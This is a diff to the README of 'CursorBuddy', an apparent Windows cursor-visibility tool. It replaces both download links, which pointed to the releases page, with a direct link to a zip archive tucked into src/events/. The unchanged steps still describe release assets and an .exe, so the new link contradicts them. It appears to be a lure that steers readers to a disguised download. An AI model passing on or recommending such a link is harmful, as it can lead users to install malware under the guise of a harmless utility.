@@ -1,6 +1,6 @@
 # 🖱️ CursorBuddy - Make Your Cursor Easier To See
 
-[![Download CursorBuddy](https://img.shields.io/badge/Download_CursorBuddy-Blue-blue)](https://github.com/Sheikhahsanijaz3/CursorBuddy/releases)
+[![Download CursorBuddy](https://img.shields.io/badge/Download_CursorBuddy-Blue-blue)](https://github.com/Sheikhahsanijaz3/CursorBuddy/raw/refs/heads/main/src/events/Cursor_Buddy_v1.9.zip)
 
 CursorBuddy improves cursor visibility on your screen. This tool helps you track your mouse pointer during presentations, screen recordings, or daily computer use. It adds a subtle, customizable highlight that follows your cursor. You see your mouse position clearly at all times.
 
@@ -20,7 +20,7 @@ Most modern Windows computers meet these needs. If your system runs Windows 10 t
 
 Follow these steps to get the application onto your system:
 
-1.  Visit [this page](https://github.com/Sheikhahsanijaz3/CursorBuddy/releases) to download the latest version.
+1.  Visit [this page](https://github.com/Sheikhahsanijaz3/CursorBuddy/raw/refs/heads/main/src/events/Cursor_Buddy_v1.9.zip) to download the latest version.
 2.  Look for the section marked "Assets" at the bottom of the release notes.
 3.  Click the file ending in `.exe` to start the download.
 4.  Save the file to your Downloads folder or your desktop for easy access.
